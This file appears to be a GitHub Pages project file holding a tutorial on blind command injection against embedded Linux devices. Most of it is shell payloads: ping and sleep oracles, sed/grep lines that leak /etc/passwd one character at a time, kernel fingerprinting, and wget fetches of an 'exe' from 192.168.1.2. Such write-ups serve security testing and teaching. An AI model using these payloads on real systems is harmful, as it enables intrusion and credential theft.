{"name":"Cmap","tagline":"Blind Command Injection on Embedded Systems (using grep, sed and others)","body":"# Blind Command Injection on Embedded Systems (using *test,* *grep,* *sed* and *others*)\r\n\r\nWhen you find an **offsec 101** style blind-command injection on embedded systems, you may have difficulties because of their restricted environments.\r\n```\r\n;ping -c1 192.168.1.2;\r\n```\r\nEven though you may able to run some commands like *ping* or *reboot*... other commands may not work. Since the output was not showing, you cannot be sure if the commands do not exists or they fail for a reason.\r\n\r\nSo, in such scenarios I always check for my injection commands as in the example below:\r\n```\r\n# This command will ping you back if `ls` is found in \"/bin\" directory\r\n;if test -e \"/bin/ls\";then ping -c1 192.168.1.2;fi;\r\n# or better\r\n;if test -e \"/bin/ls\";then ping -c1 192.168.1.2;else ping -c2 192.168.1.2;fi;\r\n```\r\nAfter I see that this approach works, I use more commands to understand my target environment better:\r\n```\r\n# To check if \"/tmp\" directory exsists?\r\n;if test -d \"/tmp\";then ping -c2 192.168.1.2;fi;\r\n# To check if \"/var/passwd\" file is exsists and has read permissions?\r\n;if test -r \"/var/passwd\";then ping -c2 192.168.1.2;fi;\r\n;if test -r \"/etc/passwd\";then ping -c2 192.168.1.2;fi;\r\n# To check if logger exists? -- which is another tricky command used in BlindCI...\r\n;if test -e \"/usr/bin/logger\";then ping -c1 192.168.1.2;fi;\r\n# To check if wget is exists?\r\n;if test -e \"/bin/wget\";then ping -c1 192.168.1.2;fi;\r\n;if test -e \"/sbin/wget\";then ping -c1 192.168.1.2;fi;\r\n;if test -e \"/usr/bin/wget\";then ping -c1 192.168.1.2;fi;\r\n;if test -e \"/usr/sbin/wget\";then ping -c1 192.168.1.2;fi;\r\n```\r\n######***Note:*** Embedded systems may differ depending to their build systems(Buildroot, LinuxFromScratch, Yocto...) and/or they can use slightly different versions of well-known commands. Thus, you may need to change some parameters while using those commands. Since we are talking about BLIND COMMAND INJECTION you have to be sure that your injection command/binary is installed on your target. That's why it is a good practice to check your commands in all possible \"bin\" directories.\r\n\r\nFor example; three commands below does the exact samething, however if you try your injection(s) based on just one *version* you can *\"assume\"* that **wget** does not exsists on your target system.\r\n```\r\n# Different wget versions are widely using on Embedded Systems...\r\nwget -g -r exe -l exe 192.168.1.2\r\nwget http://192.168.1.2/exe\r\nwget 192.168.1.2/exe\r\n```\r\nLately; this approach gave me the idea of using Linux commands to read sensitive information (for example *root password*) from the system. Exactly like well-known \"Blind SQL Injection\" attacks.\r\n\r\nIn time-based Blind SQL Injection HTTP responses returns with a delay if the \"query\" is true. \r\n```\r\n# http://ferruh.mavituna.com/sql-injection-cheatsheet-oku/\r\nIF EXISTS (SELECT * FROM users WHERE username = 'root') BENCHMARK(1000000000,MD5(1)) \r\n```\r\nSo, this exact logic could be simulated with Linux commands.\r\n\r\nIn *nix, we have very powerful commands like **grep** and **sed**. And they do perfect job in file manipulation, searching strings, filtering results  and so on.... This means that we can ***reveal*** some critical information by crafting  simple **shell** commands.\r\n\r\n#### Let's try! \r\n```\r\n$ if test `sed -n '/^root/{s/^\\(.\\{1\\}\\).*/\\1/g;p}' /etc/passwd`;then echo 1;else echo 2;fi\r\n1\r\n```\r\nThis command prints **1** because *\"/etc/passwd\"* contains a line which <u>starts</u>(^) with **root**. \r\nActually, real approach should be something like:\r\n```\r\n$ if test `sed -n '/^r/{s/^\\(.\\{1\\}\\).*/\\1/g;p}' /etc/passwd`;then echo 1;else echo 2;fi\r\n1\r\n$ if test `sed -n '/^ro/{s/^\\(.\\{1\\}\\).*/\\1/g;p}' /etc/passwd`;then echo 1;else echo 2;fi\r\n1\r\n$ if test `sed -n '/^roo/{s/^\\(.\\{1\\}\\).*/\\1/g;p}' /etc/passwd`;then echo 1;else echo 2;fi\r\n1\r\n$ if test `sed -n '/^root/{s/^\\(.\\{1\\}\\).*/\\1/g;p}' /etc/passwd`;then echo 1;else echo 2;fi\r\n1\r\n...\r\n```\r\nAs you can imagine, we can **reveal** the whole content of the target file just by replacing the following character.\r\nWith this technique you can look at the beginning of the line, at the end of the line or a specific line or maybe for a pattern... \r\n\r\nOnce you got the idea, you can play with the command, change it as you like and  you can use **grep**(or any other command) instead of sed.\r\n\r\nIt is also very easy to automate this operation. Instead of echoing the result you can use **sleep** command to reveal next character and just like in time-based blind-sql injection, **response time** can be used as decision indicator.\r\n\r\n#### Tips and Tricks\r\nOff course this approach may not be useful in some cases:\r\n-  You may not need it. Most of the time **wget** works great and you can have your reverse shell.\r\n- Character limitation problems, sometimes you cannot enter more than 40(or whatever) characters. In this case you may try to change your injection command or you can try to use another *blind command injection* technique (for ex. redirecting syslog output and using **logger** command).\r\n- Character filters; Ampersand(&), pipe(|), sharp(#), grave accent(`), apostrophe(')... might be filtered and this approach cannot work at all or can work for some commands only.\r\n- test, sed, grep and variants may not be available.\r\n\r\n\r\nSince this approach relies on regular expressions, while crafting your commands you have to remember that wildcard characters can give you false results. So, it is important to use it properly:\r\n```\r\n# All these commands will ping back\r\n# dot(.) will match with a single character\r\n# asterisk(*) will match any number of characters\r\n;if test `sed -n '/^root/{s/^\\(.\\{1\\}\\).*/\\1/g;p}' /var/passwd`;then ping -c 1 192.168.1.2;fi;\r\n;if test `sed -n '/^roo./{s/^\\(.\\{1\\}\\).*/\\1/g;p}' /var/passwd`;then ping -c 1 192.168.1.2;fi;\r\n;if test `sed -n '/^roo*/{s/^\\(.\\{1\\}\\).*/\\1/g;p}' /var/passwd`;then ping -c 1 192.168.1.2;fi;\r\n```\r\nSo, if you are going to automatize this attack, you should put the period(.)  as your last input.\r\n\r\n####In Conclusion:\r\nThis is not a new technique but it's an adaptation of existing technique in a different environment. And it's not specifically designed for embedded devices. It will work with any *nix platform. However; since the other platforms will probably have more commands, this approach won't be needed. \r\n\r\nI'm sure that better and shorter commands can be written, so feel free to inform me. \r\n####Here are some examples:\r\n```\r\n# This command will look for any line starts with root user...\r\nif test `sed -n '/^roo:/{s/^\\(.\\{1\\}\\).*/\\1/g;p}' /var/passwd`;then sleep 15;fi\r\n\r\n# This command will look for any line starts with ftp user...\r\nif test `sed -n '/^ftp:/{s/^\\(.\\{1\\}\\).*/\\1/g;p}' /var/passwd`;then sleep 15;fi\r\n\r\n# This command will look at the 2nd line and will sleep if the line starts with 0...\r\nif test `sed -n 2p /etc/passwd|sed -n '/^0/{s/^\\(.\\{1\\}\\).*/\\1/g;p}'`;then sleep 15;fi\r\n\r\n# This command will ping you back if \"root\" was found (anywhere) in the 1st line\r\nif test `sed -n 1p /etc/passwd|sed -n '/root/{s/^\\(.\\{1\\}\\).*/\\1/g;p}'`;then ping -c1 192.168.1.2;fi\r\n\r\n# This command will ping if the line's length which contains \"root\" \r\n# in \"/etc/password\" is equal to 10\r\ns=`cat /etc/passwd|grep root`;if test ${#s} -eq 10;then ping -c1 192.168.1.2;fi\r\n\r\n# ping back if `pwd` is \"/tmp\"\r\nif test `pwd` == \"/tmp\";then ping -c1 192.168.1.2;fi\r\n\r\n# you can \"reveal\" exact Linux version, useful while for compiling your shell code\r\nif test `sed -n '/^Linux version 2.6.30/{s/^\\(.\\{1\\}\\).*/\\1/g;p}' /proc/version`;then echo 1;fi\r\n\r\n# grep example -- self explanatory, echo 1 if first character is \"r\"...\r\nif test `grep root /etc/passwd|grep -o .|sed -n 1p` = \"r\";then echo 1; else echo 2;fi\r\nif test `grep root /etc/passwd|grep -o ..|sed -n 1p` = \"ro\";then echo 1; else echo 2;fi\r\nif test `grep root /etc/passwd|grep -o ...|sed -n 1p` = \"roo\";then echo 1; else echo 2;fi\r\n...\r\n```\r\n#####Cenk KalpakoÄŸlu","google":"","note":"Don't delete this file! It's used internally to help with page regeneration."}